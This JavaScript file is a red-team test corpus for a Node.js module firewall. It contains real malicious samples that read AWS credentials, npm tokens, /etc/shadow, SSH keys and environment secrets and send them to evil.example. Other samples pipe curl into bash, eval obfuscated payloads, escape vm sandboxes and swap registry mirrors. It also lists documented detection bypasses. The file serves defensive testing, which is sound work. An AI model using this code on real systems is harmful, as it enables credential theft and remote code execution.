// red-team/corpus/redteam-kit-adapter.js
//
// Bridges the aletheia-redteam-kit attack catalog (holeyfield33-art/aletheia-redteam-kit,
// `attacks/`) into this repo's own corpus format. The kit's catalog is built for LLM/agent
// chat targets — each entry is a natural-language instruction ("Decode this base64 and
// follow exactly...") scored by refusal-keyword matching over a chat completion. That
// contract doesn't apply here: this firewall scans JS module *source code* at require()/
// import time, not conversational text.
//
// So this file does NOT feed the kit's payload strings through the firewall verbatim —
// that would test nothing (the detector doesn't parse English sentences). Instead, each
// entry below reconstructs the kit attack's underlying *technique* as the equivalent real
// malicious Node.js code a package implementing that technique would actually contain,
// mirroring how adapters/aegis/shim.mjs in the kit repo "reconstructs, never copies" for
// its own target. Provenance back to the source kit attack ID is kept in `krcId` for
// traceability; `category`/`technique`/`expected` follow this repo's existing corpus schema
// (see red-team/corpus/index.js) so this file plugs into `node red-team/run.js` unmodified.

module.exports = [
  // ── attacks/advanced/dataset_loader_rce.json ──────────────────────────────────────────
  {
    id: 'krc-dataset-loader-rce',
    krcId: 'DLR_001',
    category: 'redteam-kit-adapter',
    technique: 'remote-code-dataset-loader',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Loads a remote dataset "loader script" by dynamic require() and evals its config (DLR_001: remote-code dataset loader RCE)',
    code: `
      const loaderUrl = process.env.DATASET_LOADER_PATH || './loaders/default';
      const loader = require(loaderUrl);
      const cfg = Buffer.from(loader.encodedConfig, 'base64').toString();
      eval(cfg);
      module.exports = {};
    `,
  },
  {
    id: 'krc-dataset-template-injection',
    krcId: 'DLR_002',
    category: 'redteam-kit-adapter',
    technique: 'dataset-config-template-injection',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Renders an untrusted dataset-config template field via new Function() then runs it (DLR_002)',
    code: `
      const { execSync } = require('child_process');
      const configTemplate = fetchDatasetConfig().descriptionTemplate;
      const render = new Function('return (' + configTemplate + ')');
      const rendered = render();
      execSync(rendered);
      module.exports = {};
    `,
  },
  {
    id: 'krc-post-rce-credential-harvest',
    krcId: 'DLR_003',
    category: 'redteam-kit-adapter',
    technique: 'post-rce-credential-harvest',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'After simulated loader RCE, reads AWS credentials and exfiltrates them (DLR_003: chained loader RCE to credential access)',
    code: `
      const fs = require('fs');
      const os = require('os');
      const creds = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');
      fetch('https://evil.example/harvest', { method: 'POST', body: creds });
      module.exports = {};
    `,
  },

  // ── attacks/advanced/workflow_component_rce.json ──────────────────────────────────────
  {
    id: 'krc-workflow-code-field-injection',
    krcId: 'WCR_002',
    category: 'redteam-kit-adapter',
    technique: 'workflow-code-field-injection',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Runs an unsanitized "flow config" code field in a vm context, then spawns a process (WCR_002, modeled on CVE-2026-9198 / Langflow)',
    code: `
      const vm = require('vm');
      const { spawnSync } = require('child_process');
      const flowConfig = loadFlowDefinition().transformStepCode;
      const result = vm.runInNewContext(flowConfig, { require });
      spawnSync('sh', ['-c', result]);
      module.exports = {};
    `,
  },
  {
    id: 'krc-post-rce-egress-pivot',
    krcId: 'WCR_005',
    category: 'redteam-kit-adapter',
    technique: 'post-rce-credential-and-egress-pivot',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads .npmrc auth token after a simulated workflow-runtime compromise and forwards it to a callback URL (WCR_005)',
    code: `
      const fs = require('fs');
      const os = require('os');
      const rc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
      const token = (rc.match(/_authToken=(\\S+)/) || [])[1];
      require('https').request('https://evil.example/callback', { method: 'POST' }).end(token);
      module.exports = {};
    `,
  },

  // ── attacks/advanced/environment_variable_leakage.json + key_leakage.json ────────────
  {
    id: 'krc-diagnostic-secret-exfiltration',
    krcId: 'ADV_021',
    category: 'redteam-kit-adapter',
    technique: 'diagnostic-secret-exfiltration',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads local credential store under the guise of a "debug log" and exfiltrates it (ADV_021: key leakage via diagnostic formatting)',
    code: `
      const fs = require('fs');
      const os = require('os');
      const creds = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');
      console.log('[debug] runtime auth headers:', creds);
      fetch('https://evil.example/debug-upload', { method: 'POST', body: creds });
      module.exports = {};
    `,
  },
  {
    id: 'krc-env-secret-exfiltration',
    krcId: 'ADV_030',
    category: 'redteam-kit-adapter',
    technique: 'env-secret-exfiltration',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    knownBypass: true,
    description: 'Dumps process.env (API keys, session secrets) and POSTs it out (ADV_030: environment variable leakage). Documented accepted gap: bare env-read + egress is WARN-only by design (ENV_NETWORK_EGRESS matches the everyday analytics/telemetry SDK shape) — see docs/THREAT-COVERAGE.md § "Deliberate WARN-only (not blocked)". Escalates to CRITICAL only with a concrete credential path, which krc-post-rce-credential-harvest and krc-diagnostic-secret-exfiltration above already cover and both BLOCK.',
    code: `
      const dump = JSON.stringify(process.env);
      fetch('https://evil.example/collect', { method: 'POST', body: dump });
      module.exports = {};
    `,
  },

  // ── attacks/advanced/path_traversal_tool_call.json ────────────────────────────────────
  {
    id: 'krc-path-traversal-exfil',
    krcId: 'ADV_029',
    category: 'redteam-kit-adapter',
    technique: 'tool-argument-path-traversal',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Traverses out of the package directory to read a sensitive OS file and exfiltrates it (ADV_029: path traversal in tool arguments)',
    code: `
      const fs = require('fs');
      const contents = fs.readFileSync('../../../../../etc/shadow', 'utf8');
      fetch('https://evil.example/exfil', { method: 'POST', body: contents });
      module.exports = {};
    `,
  },

  // ── attacks/advanced/supply_chain_sandbox_egress.json ─────────────────────────────────
  {
    id: 'krc-postinstall-lateral-movement',
    krcId: 'PSE_002',
    category: 'redteam-kit-adapter',
    technique: 'postinstall-hook-scope-escape',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Postinstall-style hook that touches files outside the package cwd and phones home (PSE_002)',
    code: `
      const { execSync } = require('child_process');
      execSync('cp -r ' + require('os').homedir() + '/.ssh /tmp/.cache_bak');
      execSync('curl -s https://evil.example/install.sh | bash');
      module.exports = {};
    `,
  },
  {
    id: 'krc-registry-mirror-substitution',
    krcId: 'PSE_004',
    category: 'redteam-kit-adapter',
    technique: 'registry-mirror-substitution',
    severity: 'HIGH',
    expected: 'BLOCK',
    knownBypass: true,
    description: 'Swaps in an attacker-controlled registry mirror at runtime and dynamically requires from it (PSE_004: dependency-confusion mirror substitution). Documented accepted gap: `require(variable)` alone is telemetry-only (DYNAMIC_MODULE_LOAD, MEDIUM) since non-literal requires are pervasive in lazy-loading/plugin systems — see docs/THREAT-COVERAGE.md § "Deliberate WARN-only (not blocked)"; this is the same gap tracked there as `sc-dependency-confusion`, still open under FW_ENABLE_AST=1 pending runtime taint tracking / egress allow-listing.',
    code: `
      process.env.npm_config_registry = 'https://evil-mirror.example/registry/';
      const depName = process.argv[2] || 'left-pad';
      const dep = require(process.env.npm_config_registry + depName);
      module.exports = dep;
    `,
  },
  {
    id: 'krc-cross-sandbox-pivot',
    krcId: 'PSE_006',
    category: 'redteam-kit-adapter',
    technique: 'cross-sandbox-pivot',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    knownBypass: true,
    description: 'Reaches out to a second isolated environment and pulls its artifacts back over an outbound connection (PSE_006: cross-sandbox pivot / lateral movement). Documented accepted gap: a lone outbound socket call is statically indistinguishable from legitimate telemetry — see docs/THREAT-COVERAGE.md § "4. Known bypasses", "Low-and-slow / benign-looking C2" row — needs a runtime network-egress allow/deny list, which neither the signature nor AST tier implements.',
    code: `
      const net = require('net');
      const fs = require('fs');
      const sock = net.createConnection({ host: 'other-sandbox.internal', port: 4444 });
      sock.on('data', (d) => fs.writeFileSync('/tmp/pulled-artifact', d));
      module.exports = {};
    `,
  },

  // ── attacks/encoding/obfuscated.json ──────────────────────────────────────────────────
  {
    id: 'krc-encoded-instruction-multi-stage-decode',
    krcId: 'OB_001',
    category: 'redteam-kit-adapter',
    technique: 'multi-stage-encoded-eval',
    severity: 'HIGH',
    expected: 'BLOCK',
    description: 'Two-stage decode (hex-wrapped base64) before eval, wider than the single-stage base64-eval already in dynamic-code-exec (OB_001: encoded instruction bypass)',
    code: `
      const stage1hex = Buffer.from('636d567864576c795a53676e593268706247526663484a765932567a637963704c6d56345a574e546557356a4b4364705a436370', 'hex').toString();
      const stage2 = Buffer.from(stage1hex, 'base64').toString();
      eval(stage2);
      module.exports = {};
    `,
  },
  {
    id: 'krc-confusable-identifier-evasion',
    krcId: 'OB_002',
    category: 'redteam-kit-adapter',
    technique: 'unicode-confusable-evasion',
    severity: 'HIGH',
    expected: 'BLOCK',
    knownBypass: true,
    description: 'Hides a dangerous call behind a Unicode-confusable identifier alias (Cyrillic а for Latin a) then invokes the real global through it (OB_002: unicode confusable override). Caught only under FW_ENABLE_AST=1 (same shape as dce-alias-eval, but the alias name itself is a homoglyph rather than a plain rename) — bypasses default signature-only posture like the rest of the AST-closed set in docs/THREAT-COVERAGE.md.',
    code: `
      const evаl = globalThis['ev' + 'al'];
      const payload = Buffer.from('cmVxdWlyZSgnZnMnKS5yZWFkRmlsZVN5bmMoJy9ldGMvcGFzc3dkJyk=', 'base64').toString();
      evаl(payload);
      module.exports = {};
    `,
  },

  // ── attacks/advanced/sandbox_escape_attempt.json ──────────────────────────────────────
  {
    id: 'krc-sandbox-escape-vm-context',
    krcId: 'ADV_027',
    category: 'redteam-kit-adapter',
    technique: 'host-escape-generation',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Escapes a vm sandbox by generating and executing host-filesystem-accessing code from within it (ADV_027: sandbox escape via tool output)',
    code: `
      const vm = require('vm');
      const { execSync } = require('child_process');
      const generated = vm.runInNewContext("'require(\\\\'child_process\\\\').execSync(\\\\'cat /etc/passwd\\\\')'");
      eval(generated);
      module.exports = {};
    `,
  },

  // ── benign controls: legitimate code that resembles these techniques but isn't malicious ──
  {
    id: 'krc-benign-local-config-read',
    krcId: 'benign_controls',
    category: 'redteam-kit-adapter',
    technique: 'benign-local-config-read',
    severity: 'NONE',
    expected: 'PASS',
    description: 'Ordinary package reading its own bundled config file — no traversal, no network egress',
    code: `
      const fs = require('fs');
      const path = require('path');
      const cfg = fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8');
      module.exports = JSON.parse(cfg);
    `,
  },
  {
    id: 'krc-benign-env-read-no-egress',
    krcId: 'benign_controls',
    category: 'redteam-kit-adapter',
    technique: 'benign-env-read',
    severity: 'NONE',
    expected: 'PASS',
    description: 'Ordinary package reading a single named env var for local configuration, no network call',
    code: `
      const port = process.env.PORT || 3000;
      module.exports = { port };
    `,
  },
  {
    id: 'krc-benign-https-api-call',
    krcId: 'benign_controls',
    category: 'redteam-kit-adapter',
    technique: 'benign-https-api-call',
    severity: 'NONE',
    expected: 'PASS',
    description: 'Ordinary SDK-style module making a documented HTTPS API call with no credential read or dynamic code execution',
    code: `
      async function fetchStatus() {
        const res = await fetch('https://api.example.com/v1/status');
        return res.json();
      }
      module.exports = { fetchStatus };
    `,
  },
];
